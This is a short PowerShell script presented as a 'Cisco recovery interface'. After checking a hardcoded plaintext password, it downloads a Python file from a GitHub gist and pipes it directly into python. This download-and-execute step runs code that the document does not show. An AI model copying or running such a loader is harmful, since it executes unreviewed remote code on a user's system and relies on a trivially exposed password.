# BHOOMI REMOTE INTERFACE
Clear-Host
$C = [ConsoleColor]::Cyan

Write-Host "--- BHOOMI CISCO RECOVERY INTERFACE ---" -ForegroundColor $C
$pass = Read-Host "Enter Access Password"

if ($pass -eq "Dinesh") {
    Write-Host "[+] Authentication Successful. Launching Engine..." -ForegroundColor Green
    
    # URL to your Python Gist
    $url = "https://gist.githubusercontent.com/urflameww/e0685a4f3ab6325dceda596f7f45d611/raw/Bhoomi.py"
    $code = (New-Object Net.WebClient).DownloadString($url)
    
    # This pipes the code into Python so we don't hit the character limit
    $code | python -
} else {
    Write-Host "[-] Access Denied." -ForegroundColor Red
    Start-Sleep -Seconds 2
}
